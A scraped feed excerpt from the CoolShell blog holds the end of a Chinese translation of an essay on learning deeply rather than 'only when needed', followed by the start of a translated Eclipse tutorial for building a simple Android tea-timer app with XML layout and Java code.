<p>我们都有过这样的时候，当我们痛苦地在解决一个问题的时候，有人突然告诉你一个算法或是一个技术，其把这个问题变得又快又简单。是的，有人告诉你一个容易的方法是一件很幸运的事，否则你可能需要花上数天或数周才能找到解决方法，并且事情可能会变得一团糟。你不会因此而被批评，因为你不知道你所不知道的东西。对此，“<strong><em>I will learn it when I need it – </em>我会在我需要的时候再学</strong>”在这个时候就走不通了。因为，<strong>你不可能学习那些你以为不存在的东西</strong>。Google做了很多的工作来减轻和缓解这样的问题，但并不完美。在一个陌生的环境下面对着一堆陌生的问题，会让你非常非常地痛苦，除非你知道你所面对的是什么（例如：如果你对搜索和约束传播（<em>constraint propagation</em>）有点了解的话，那你就可能 <a href="http://norvig.com/sudoku.html" target="_blank">容易地解决数独问题</a>，否则的话， <a href="http://xprogramming.com/xpmag/OkSudoku" target="_blank">这的确是</a> <a href="http://xprogramming.com/xpmag/SudokuMusings" target="_blank">非常</a> <a href="http://xprogramming.com/xpmag/Sudoku4" target="_blank">难的</a>）。你无法学习一种不知道或是你不知道用在哪里的算法。你也不可能去用一个你以为不存在的技术去解决一个问题。同样，你身边也不可以一直都有一个高人随时在给你指引正确的方向。我敢打赌，<strong>这个世界上有几十亿行代码可以被 几百万行更快，更清楚，更简单的代码所取代，因为无论是谁来写，他都不可能知道他所不知道的东西</strong>。</p>
<p>我想在这里成为这个观点的反方，如果我们知道我们有哪些东西我们不知道，那么我们就知道我们需要去关注哪些东西。粗浅地尽可能的大范围的知道这些东西，那么，我们就可以在遇到问题的时候明白我们应该去更深地学什么样的知识。但是，这样来做在实际上并不有效，因为，<strong>这些浮云般的知识不会让你记下来</strong>，我们的大脑不是这样工作的。如果我们不去强化或是深度挖掘去消化这些概念， 我们的大脑会很快地 <a href="http://www.skorks.com/2009/09/become-a-better-developer-by-indexing-your-brain/" target="_blank">把这些信息标为不重要并换页出去</a>，这么做无非就是在浪费时间（你回头想一想你那些“填鸭式”的死记硬背的知识，你今天还记得吗？）然而，对于那些你集中精力深度研究过的东西——并伴随着你的兴趣的东西——你会收获到扎实的知识（那是你大脑里实际存下的不会忘的东西）。我的爷爷是一个核物理学家，数十年的在工作中获得这个领域中更深的知识让他今天成为了一个专家，同时也让他成为了一个优秀的数学家，不错的化学家，非常好的地理学家，还是一个合格的生物学家，等等。只需要一些 <a href="https://en.wikipedia.org/wiki/Empirical" target="_blank">观察性的证据</a> 你就知道<strong>广度的知识是深度研究的副产品</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E4%BD%A0%E5%AD%A6%E5%BE%97%E8%B6%B3%E5%A4%9F%E5%BF%AB%E5%90%97%EF%BC%9F"></span>你学得足够快吗？<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<p>有些东西你需要花很长的时间才能学会。我对自己有信心不需跳跃性的就能把一个我从没有见过的ORM框架学会，因为我以前用过相似的东西，它们在概念上是相同的。但是，如果你需要做一个把演讲转成文本的东西呢，这并不简单，因为你没有足够多的背景知识。你可以希望通过Google给你提供一些东西让你Copy/Paste，但这是一个很不好的做法，只有大学里的做研究的研究员干这种烂事。如果是要创建一个网站呢，我们都知道怎么去创建一个网站，但是有多少人会知道如何架构一个每天有一千万用户访问的网站？那么我们需要去学的就是怎么做扩容扩展，<strong>我相信你的用户需要等你一到两个月才能把速度提上去</strong> :)。是的，我太笨了，所有我需要做的就是去招一个专家，然后……嗯……哦等一下，我们的啤酒和三明治都不够了。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E5%BA%94%E8%AF%A5%E5%85%B3%E5%BF%83"></span>为什么我应该关心<span class="ez-toc-section-end"></span>
</h4>
<p><strong>和高手在一起工作真是超爽无比</strong>。你也许以前经历过，他们每说的一件事总是新鲜的，总是有意思的，你能从他们每一行的代码中学到很多小技巧，你几乎可以感觉到你的大脑在不断膨胀:)。你想从高手学习，所以，如果你身边没有高手，那真是太糟糕了。因为每一个人只会去学那些“需要”被学的东西，所以没有人能教给你任何有意思的东西。然而，这些高手也总是想和高手一起工作， 所以，<strong>你需要做的事就是确定能让高手想和你一起工作？</strong>。按需所学也许是一个不错的技能，但其不应该成为程序员的价值观。是的，这是一个巨大的行业你不可能学习所有的东西，所以，你需要有所选择地把其学精，只要你有足够的好奇心去跟从你的兴趣，你会发现最终你会真正掌握很多很多其它的东西。如果你能把你的工作做好，那么其它的超级牛人都会想要和你一起工作，因为他们可以从你这学到东西，而你又可以从他们那里学到东西。这样一来，所有的人都会是成功者。</p>
<p>Image by <a href="https://www.flickr.com/photos/samueleghilardi/2971657900/" target="_blank">SamueleGhilardi</a> and <a href="https://www.flickr.com/photos/specialkrb/3250756763/">SpecialKRB</a></p>
<p>—————————————————正文结束分割线——————————————————</p>
<p>我在这里想说几个我的观点：</p>
<ol>
<li>我特别同意作者的，如果你把一个技术搞精搞深，你的知识面自然会很广的。</li>
<li>面对于各种比较深的东西（比如C++的奇技淫巧），作为一个实用主义者可能很不屑，但是你也会为此而失去开阔眼界的机会。</li>
<li>为明天做一些技术储备，因为你不知道你所缺的东西。多多阅读，多多交流，最好能把自己的心得写下来强化自己的认识和记忆。</li>
<li>不要只寄望于在工作中学习，工作没有覆盖的地方你就不学了。真正的高手在工作之余都会花很多时间去自己研究点东西的。</li>
<li>永远和高手一起工作。如果你面试的公司的面试太简单了，那就不要去，因为简单的面试通常意味着平庸。去那样的公司工作只会让你的学习速度变慢，甚至倒退。</li>
<li>很多东西在概念上是相通的，在哲学层次上是相通的，这是你需要去追求的学习知识的境界。</li>
<li>最后echo一下作者的话——“很多时候，你缺少的不是知识而是热情”！</li>
</ol>
<p>谢谢大家又花了一点看我的唠叨。呵呵。</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4235" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="29fc90801e">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>113</strong> 人打了分，平均分： <strong>4.78</strong> )<br><span class="post-ratings-text" id="ratings_4235_text"></span><meta itemprop="name" content="程序员的谎谬之言还是至理名言？">
<meta itemprop="headline" content="程序员的谎谬之言还是至理名言？">
<meta itemprop="description" content="有朋友（网友never）在酷壳Coolshell.cn的留言版上问我，为什么关注了这很多的东西，我想我可以用下文来回答这位网友，因为我和作者的观点几乎一致。这篇文章由 ALAN SKORKIN写的 “The Greatest Developer Fallacy Or The Wisest Words You’ll Ever Hear?” ，我把其全文翻译如下，我很喜欢这篇文章，希望你也喜欢。（翻译...">
<meta itemprop="datePublished" content="2011-04-07T10:08:59+08:00">
<meta itemprop="dateModified" content="2011-04-07T18:18:47+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4235.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4235.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.78">
<meta itemprop="ratingCount" content="113">
</div>
</div>
<div id="post-ratings-4235-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-07T10:08:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/4235.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Eclipse开发Android应用程序入门 ]]></title>
<link>https://coolshell.cn/articles/4270.html</link>
<content><![CDATA[ 
<p>By <a title="Posts by Chris Blunt" href="http://www.smashingmagazine.com/author/chris-blunt/">Chris Blunt</a></p>
<p><strong>翻译：赵锟</strong><br>
原文出处：<a href="http://www.smashingmagazine.com/2010/10/25/get-started-developing-for-android-with-eclipse/">http://www.smashingmagazine.com/2010/10/25/get-started-developing-for-android-with-eclipse/</a></p>
<p>如今的移动设备应用程序开发充满着让人振奋的东西。功能强大的硬件支持，平板电脑，多样的软件平台（塞班 OS，iOS，WebOS，Windows Phone 7…)，移动设备开发者前景充满了机会和挑战。</p>
<p>当你想要开始开发你的移动设备程序时，如此多的选择可能让你产生困扰。究竟应该选择神马平台？我应该学习神马语言？为你计划的项目选择神马工具？在本教程中，你将学会如何在Google公司的开源移动设备操作系统Android下开发应用程序。</p>
<h3>为神马选Android</h3>
<p>Android是一个基于Linux内核的开源平台， 并且被安装在来自于不同厂商的上千种设备中。Android将各种移动设备的硬件如 电子罗盘，摄像头，GPS，方向感应，等等暴露给你的应用程序。<br>
<span id="more-4270"></span><br>
Android的免费开发工具可以让你以0成本开始编写你的软件。当你想向世界展示你的应用程序的时候，你可以将你的软件发布到Google的 Android 市场。向Andriod Market 发布程序只一次性的收取注册费用（25元），并且不像苹果的App Store ，对每一次的提交都要做检查，除非你的程序明显地违法，在经过一个快速检查的流程后，才能让你的程序提供给客户下载和购买。</p>
<p>下面是Android对于开发者的优点：</p>
<ul>
<li>Android的SDK可以在Windows,Mac和Linux上运行，因此你不需要为了开发环境支付额外的新硬件投入。（译者注：我曾近在Win7 64x + VMWare上成功的安装Mac Snow leopard + XCode的开发环境，对于爱用盗版的人来说，这点MS优势不是很大啊）</li>
<li>构建于JAVA上的SDK。如果你熟悉JAVA语言，你就是事半功倍了。（译者注：这个酷壳有篇文章讨论过，大家可以参看：<a href="https://coolshell.cn" target="_blank">https://coolshell.cn</a>）</li>
<li>你只要在Android Market上发布应用程序，你将有潜在的成千上万的用户。而且你不一定非要把程序发布在Android Market上，你还可以在你的博客上发布。而且有传言，Amazon已近在最近准备搭建他们自己的Android 应用程序商店了。</li>
<li>除了了技术性的<a href="https://developer.android.com/sdk/index.html">SDK 文档</a>外,还可以找到其他更多的使用者和开发者的资源。</li>
</ul>
<p>闲话少说——下面让我们进入正题，开始开发我们的Android应用程序。</p>
<h3>安装Eclipse和Android SDK</h3>
<p>Android应用程序的推荐开发环境是带有Android开发包插件(Android Devlopment Toolkit (ADT))的Eclipse。我在这里简要说明一下安装流程。如果你需要更多的细节，Google的<a href="https://developer.android.com/sdk/">开发人员网页</a>中详尽地解释了具体的安装配置过程</p>
<ul>
<li>为你的平台下载<a href="https://developer.android.com/">Android SDK</a>（Windows ， Mac OS X 或者 Linux）。</li>
<li>在你的硬盘上解压下载文件 (在Linux, 我使用 /opt/local/).</li>
<li>如果你没有安装Eclipse，下载并安装<a href="https://eclipse.org/downloads/packages/eclipse-ide-java-developers/galileosr2">Eclipse JAVA 集成开发环境</a>包。 用于编程的话, Google推荐使用Eclipse 3.5 (Galileo).</li>
<li>运行Eclipse 并选择<em>Help-&gt;Install New Software</em>.</li>
<li>在Available Software窗口中点击Add按钮。</li>
<li>进入 Android Development Tools 的<em>Name</em>输入框, 在Location 输入框输入https://dl-ssl.google.com/android/eclipse/</li>
<li>检查可用软件中有Developer Tools并点击OK按钮。这将安装Android Development Tools 和DDMS, Android的调试工具。</li>
</ul>
<p><img alt="image placeholder" ></p>
<ul>
<li>点击Next和Finish按钮以完成安装，安装完成后，你需要重启你的Eclipse一次。</li>
<li>在Eclipse重启后，选择Window-&gt;Preference 后你可以在分类列表中看到Android这一项了。</li>
<li>现在需要告诉Eclipse，你的Android SDK安装在什么地方。点击Android项后浏览选择你解压后的Android SDK所在的路径。例如/opt/local/android-sdk。</li>
</ul>
<p><img alt="image placeholder" ></p>
<ul>
<li>点击OK按钮，保存信息。</li>
</ul>
<h3>选择Android 平台</h3>
<p>在你开始编写Android应用程序之前，你需要为你需要开发应用程序的Android设备下载SDK平台。每个平台都有可以安装在用户设备上的不同版本的SDK。对于Android1.5或以上版本，有两个可用的平台： <em>Android Open Source Project</em> 和 <em>Google</em>.</p>
<p><em>Android Open Source Project</em> 平台是开源的，但是不包括Google公司的私有化扩展，比如Google Map。如果不选择使用Google的API，Google的地图功能就不会在你的应用程序中生效。除非你有特别的原因，否则我们推荐你选择Google平台，因为这样你可享受到Google的扩展类库提供的便利。</p>
<ul>
<li>选择<em>Window Android SDK and AVD Manager</em>.</li>
<li>点击左栏中的<em>Available Packages</em> 并选择选择Respository中有效的Android SDK平台。</li>
<li>你可以选择列表中所需要的平台，或全选下载所有有效的平台。当你选择完毕，单击<em>Install Selected </em>并完成安装。</li>
</ul>
<p><img alt="image placeholder" ><br>
一旦成功的下载所有的平台后，你就可以准备开始开发Android应用程序了。</p>
<h3>创建一个新的Android项目</h3>
<p>Eclipse的新建项目向导能为你创建一个新的Android项目，并生成可以开始运行的文件和代码。通过向导生成代码，可以让你马上得到一个Android程序运行的直观映像并为你提供了一个帮助你快速入门的方法：</p>
<ul>
<li>选择 <em>File-&gt;New-&gt;Project…</em>
</li>
<li>选择<em>Android Project</em>
</li>
<li>在<em>New Project</em> 对话框, 键入如下的设置:</li>
</ul>
<p>[code]<br>
Project Name: BrewClock<br>
Build Target: Google Inc. 1.6 (Api Level 4)<br>
Application Name: BrewClock<br>
Package Name: com.example.brewclock<br>
Create Activity: BrewClockActivity<br>
Min SDK Version: 4<br>
[/code]</p>
<p><img alt="image placeholder" ></p>
<p>在点击了完成按钮之后，Eclipse将为你创建一个新的可以运行的Android项目。注意，你通知了Eclipse生成了一个叫做BrewClockActivity的Activity。这个Activity的代码用于运行你的应用程序。生成的代码将在程序运行时非常简单地显示一条“Hello World”消息。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%8C%85" title="包">包</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#SDK_%E7%89%88%E6%9C%AC" title="SDK 版本">SDK 版本</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Android_%E8%99%9A%E6%8B%9F%E8%AE%BE%E5%A4%87" title="Android 虚拟设备">Android 虚拟设备</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E8%BF%90%E8%A1%8C%E4%BB%A3%E7%A0%81" title="运行代码">运行代码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E8%AE%BE%E8%AE%A1%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2" title="设计用户界面">设计用户界面</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%BC%80%E5%8F%91%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2" title="开发用户界面">开发用户界面</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%85%B3%E8%81%94%E4%BD%A0%E7%9A%84%E5%B8%83%E5%B1%80Layout%E4%B8%8E%E4%BB%A3%E7%A0%81" title="关联你的布局Layout与代码">关联你的布局Layout与代码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E8%B5%84%E6%BA%90%E5%AF%B9%E8%B1%A1" title="资源对象">资源对象</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E7%9B%91%E5%90%AC%E4%BA%8B%E4%BB%B6" title="监听事件">监听事件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E9%81%BF%E5%85%8D%E5%9C%A8%E4%BD%A0%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%A1%AC%E7%BC%96%E7%A0%81" title="避免在你的代码中硬编码">避免在你的代码中硬编码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E8%BF%90%E8%A1%8CBrew_Clock" title="运行Brew Clock">运行Brew Clock</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%8C%85"></span>包<span class="ez-toc-section-end"></span>
</h4>
<p>包名是你的应用程序标示。当你开始准备在Android Market上发布你的应用程序的时候，Android用这个标识符精确地记录你的应用程序的更新过程，因此让包名唯一是非常重要的。尽管我们在这里使用了com.example.brewclock这样的名字空间，对于真实的应用程序，你应该选择类似于com.你的公司名.你的应用程序名 这样的包名。</p>
<h4>
<span class="ez-toc-section" id="SDK_%E7%89%88%E6%9C%AC"></span>SDK 版本<span class="ez-toc-section-end"></span>
</h4>
<p>Min SDK Version 是你的Android程序所能运行得最早版本号。对于每个新发布的Android，SDK会增加并修改一些方法。通过选择一个版本号，Android（Android Market）会知道你的应用程序能运行在等于或晚于指定版本的设备之上。</p>
<h3>运行你的应用程序</h3>
<p>现在让我们开始在Eclipse中运行我们的应用程序。由于是第一次运行，Eclipse将会询问你的项目类型：</p>
<ul>
<li>选择<em>Run-&gt;Run</em> 或 按下 <em>Ctrl+F11</em>.</li>
<li>选择<em>Android Application</em> 并点击 <em>OK </em>按钮.</li>
</ul>
<p>Eclipse 将会在一个Android设备上运行一个应用程序。在这个时候，由于你没有任何Android设备，因此在运行时一定会返回一个失败，并且询问你是否要新建一个Android的虚拟设备。（AVD）<br>
<img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="Android_%E8%99%9A%E6%8B%9F%E8%AE%BE%E5%A4%87"></span>Android 虚拟设备<span class="ez-toc-section-end"></span>
</h4>
<p>Android 虚拟设备 (AVD) 是一个模拟真实世界中Android设备的模拟器，例如移动电话或平板电脑。你可以在不买任何真实Android设备情况下，使用AVD测试你的应用。</p>
<p>你可以创建任意多个你喜欢的AVD，每个可以建立在不同版本的Android平台之上。对于你创建的每个Android设备，你可以配置不同的硬件属性，比如是否具有物理键盘，是否支持GPS，摄像头的像素，等等。</p>
<p>在你开始运行你的应用程序之前，你需要创建你的AVD，来运行指定的SDK平台（Google APIs 1.6）。</p>
<p>现在让我开始:</p>
<ul>
<li>如果还没有开始运行你的应用程序，点击run（或按下 <em>Ctrl+F11</em>）。</li>
<li>当目标设备弹出警告，点击<em>Yes</em> 以创建新的AVD。</li>
<li>单击<em>Android SDK and AVD Manager</em> 对话框内的<em>New</em> 按钮.</li>
<li>为你的AVD键入如下的设置：</li>
</ul>
<p>[code]<br>
Name: Android_1.6<br>
Target: Google APIs (Google Inc.) – API Level 4<br>
SD Card Size: 16 MiB<br>
Skin Built In: Default (HVGA)<br>
[/code]</p>
<ul>
<li>单击 <em>Create AVD</em> 让Android为你创建一个新虚拟设备。</li>
<li>关闭the <em>Android SDK and AVD Manager</em> 对话框.</li>
</ul>
<p><img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E8%BF%90%E8%A1%8C%E4%BB%A3%E7%A0%81"></span>运行代码<span class="ez-toc-section-end"></span>
</h4>
<p>再次运行你的应用程序（<em>Ctrl+F11</em>）。 Eclipse 将build 你的项目并运行一个新的AVD。记住，AVD模拟了一个完全的Android系统，因此你需要有耐心来等待这个缓慢的启动过程，就如同你重启真实的Android设备一样。一个好的做法是不要关闭你的AVD，直到你完成了你一天的工作。<br>
当你的模拟器启动后，Eclipse自动地安装并运行你的应用程序。</p>
<p><img alt="image placeholder" ></p>
<h3>开发你第一个Android应用</h3>
<p>生成的代码能良好的运行，但是你真正想要的是开发一个真实的应用程序。为此，我们首先果一个咸蛋的设计流程，并开始创建一个可以让你部署在Android设备上的应用。</p>
<p>大部分的开发者（包括我自己）都喜欢每天一杯咖啡或茶。在下一节中，你将开发一个简单的泡茶计数器应用程序来记录用户泡了多少杯茶，并为泡每杯茶做一个定时器。</p>
<p>你可以从<a href="https://github.com/cblunt/brewclock">GitHub</a>下载整个教程的源代码.</p>
<h4>
<span class="ez-toc-section" id="%E8%AE%BE%E8%AE%A1%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2"></span>设计用户界面<span class="ez-toc-section-end"></span>
</h4>
<p>在开发任何Android应用程序之前的第一步就是设计和开发用户界面。下面是一个我们这个应用程序的用户界面的一个概览。</p>
<p><img alt="image placeholder" ></p>
<p>用户将能通过+和-按钮设置一个泡茶的定时器。当单击开始按钮，定时器将开始按指定的时间递减。除非用户再次点击按钮以取消计时，否则当定时器为0的时候，累计的泡茶计数brew将增加1。</p>
<h4>
<span class="ez-toc-section" id="%E5%BC%80%E5%8F%91%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2"></span>开发用户界面<span class="ez-toc-section-end"></span>
</h4>
<p>Android 用户界面或布局<em>layouts</em>, 是通过XML文档来描述的，可以在项目的res/layouts目录下找到。在之前运行在模拟器上代码中，我们可以看到由eclipse自动生成的布局代码在res/layouts/main.xml 中。</p>
<p>Eclipse有一个图形化的布局设计器，通过在屏幕上的拖拽控制来完成布局的设计，然而，我却发现直接写XML并使用图形布局来预览是更容易的方式。</p>
<p>现在让我们对main.xml做一些工作以达到上图的效果：</p>
<ul>
<li>在Eclipse中通过双击PackageExplorer的res/layouts/main.xml 来打开xml。</li>
<li>点击屏幕下方main.xml 来切换为xml视图。</li>
</ul>
<p>将main.xml中内容改为如下的内容：</p>
<p>[code]<br>
# /res/layouts/main.xml<br>
&lt;?xml version="1.0" encoding="utf-8"?&gt;<br>
&lt;LinearLayout<br>
xmlns:android="http://schemas.android.com/apk/res/android"<br>
android:orientation="vertical"<br>
android:layout_width="fill_parent"<br>
android:layout_height="fill_parent"&gt;<br>
&lt;LinearLayout<br>
android:orientation="horizontal"<br>
android:layout_width="fill_parent"<br>
android:layout_height="wrap_content"<br>
android:padding="10dip"&gt;<br>
&lt;TextView<br>
android:layout_width="wrap_content"<br>
android:layout_height="wrap_content"<br>
android:textSize="20dip"<br>
android:text="Brews: " /&gt;<br>
&lt;TextView<br>
android:layout_width="fill_parent"<br>
android:layout_height="wrap_content"<br>
android:text="None"<br>
android:gravity="right"<br>
android:textSize="20dip"<br>
android:id="@+id/brew_count_label" /&gt;<br>
&lt;/LinearLayout&gt;<br>
&lt;LinearLayout<br>
android:orientation="horizontal"<br>
android:layout_width="fill_parent"<br>
android:layout_height="wrap_content"<br>
android:layout_weight="1"<br>
android:gravity="center"<br>
android:padding="10dip"&gt;<br>
&lt;Button<br>
android:id="@+id/brew_time_down"<br>
android:layout_width="wrap_content"<br>
android:layout_height="wrap_content"<br>
android:text="-"<br>
android:textSize="40dip" /&gt;<br>
&lt;TextView<br>
android:id="@+id/brew_time"<br>
android:layout_width="wrap_content"<br>
android:layout_height="wrap_content"<br>
android:text="0:00"<br>
android:textSize="40dip"<br>
android:padding="10dip" /&gt;<br>
&lt;Button<br>
android:id="@+id/brew_time_up"<br>
android:layout_width="wrap_content"<br>
android:layout_height="wrap_content"<br>
android:text="+"<br>
android:textSize="40dip" /&gt;<br>
&lt;/LinearLayout&gt;<br>
&lt;Button<br>
android:id="@+id/brew_start"<br>
android:layout_width="fill_parent"<br>
android:layout_height="wrap_content"<br>
android:layout_gravity="bottom"<br>
android:text="Start" /&gt;<br>
&lt;/LinearLayout&gt;</p>
<p>[/code]</p>
<p>正如你所见的，Android的XML布局文件是繁琐的，但却能让你控制到屏幕的各个元素。</p>
<p>在Android中最重要的接口元素是布局Layout容器，例如例子中使用的LinearLayout 。这些元素对于用户是不可见的,但是却扮演者例如Buttons 和TextViews这些元素的布局容器。</p>
<p>Android中有几种不同类型的布局视图layout view，每一种都用于开发不同的布局。如同LinearLayout 和AbsoluteLayout ，TableLayout 可以让你使用更为复杂的基于表格结构的布局。你可以在SDK的API文档的<a href="https://developer.android.com/guide/topics/ui/layout-objects.html">通用布局对象</a>中查找到更多的布局。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E8%81%94%E4%BD%A0%E7%9A%84%E5%B8%83%E5%B1%80Layout%E4%B8%8E%E4%BB%A3%E7%A0%81"></span>关联你的布局Layout与代码<span class="ez-toc-section-end"></span>
</h4>
<p>保存你的布局，在Eclipse中点击<em>Run</em>图标或按下<em>Ctrl+F11</em>重新在模拟器中运行你的程序。你现看到不是之前出现的Hello World消息了，你将看到Android显示了一个新的界面。</p>
<p>如果点击界面上的任何按钮，他们将期望的显示为高亮，但是不会执行任何操作。现在让我们在布局修改后改进一下我们的源码：</p>
<p># /src/com/example/brewclock/BrewClockActivity.java</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">...
import android.widget.Button;
import android.widget.TextView;

public class BrewClockActivity extends Activity {
  /** Properties **/
  protected Button brewAddTime;
  protected Button brewDecreaseTime;
  protected Button startBrew;
  protected TextView brewCountLabel;
  protected TextView brewTimeLabel;

  ...
 }
</pre>
<p>下一步,我们将修改调用onCreate。当Android启动你的应用程序的时候，Android会首先调用这个方法。 在Eclipse生成的代码中，onCreate把activity的视图设置成R.layout.main。这行代码告诉Android解释我们的布局配置XML文件，并显示它。</p>
<h4>
<span class="ez-toc-section" id="%E8%B5%84%E6%BA%90%E5%AF%B9%E8%B1%A1"></span>资源对象<span class="ez-toc-section-end"></span>
</h4>
<p>在Android中，R是一个自动生成的对象，这是一个特殊的对象，你可以在代码中通过这个对象访问项目中的资源（布局，字符串，菜单，图标，…） 。每个资源都有一个给定的id。在上面的那个布局文件中，有一些@+id XML 属性。我们将通过这些值来关联布局中的Buttons 与TextViews和我们的代码和：</p>
<p># /src/com/example/brewclock/BrewClockActivity.java</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">...
public class BrewClockActivity extends Activity {
  ...
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    // Connect interface elements to properties
    brewAddTime = (Button) findViewById(R.id.brew_time_up);
    brewDecreaseTime = (Button) findViewById(R.id.brew_time_down);
    startBrew = (Button) findViewById(R.id.brew_start);
    brewCountLabel = (TextView) findViewById(R.id.brew_count_label);
    brewTimeLabel = (TextView) findViewById(R.id.brew_time);
  }
}
</pre>
<h4>
<span class="ez-toc-section" id="%E7%9B%91%E5%90%AC%E4%BA%8B%E4%BB%B6"></span>监听事件<span class="ez-toc-section-end"></span>
</h4>
<p>为了检测到用户单击我们的按钮，我们需要实现一个监听器listener。你可能会从其他的事件驱动系统中熟悉监听器或回调函数<em>callbacks</em>。比如Javascript/JQuery事件或Rails的回调函数。</p>
<p>Android通过Listener接口提供相似的机制，例如OnClickListener，这个接口中定义了那些会被事件触发的方法。当用户点击屏幕的时候，实现OnClickListener 接口将会通知你的应用程序，并告诉他们所按得屏幕按钮。你当然也需要告诉每个button的ClickListener，以便Android知道具体通知到那个监听器：</p>
<p># /src/com/example/brewclock/BrewClockActivity.java</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">...
// Be sure not to import
// `android.content.dialoginterface.OnClickListener`.
import android.view.View.OnClickListener;

public class BrewClockActivity extends Activity
  implements OnClickListener {
  ...
  public void onCreate(Bundle savedInstanceState) {
    ...
    // Setup ClickListeners
    brewAddTime.setOnClickListener(this);
    brewDecreaseTime.setOnClickListener(this);
    startBrew.setOnClickListener(this);
  }
  ...
  public void onClick(View v) {
    // TODO: Add code to handle button taps
  }
}
</pre>
<p>下一步，我们将增加每个按钮按下的处理过程。我们将为Activity类增加4个属性，这些属性将用来让用户设置和记录我们泡茶时间，泡茶计数，计时器是否在运行的标志。</p>
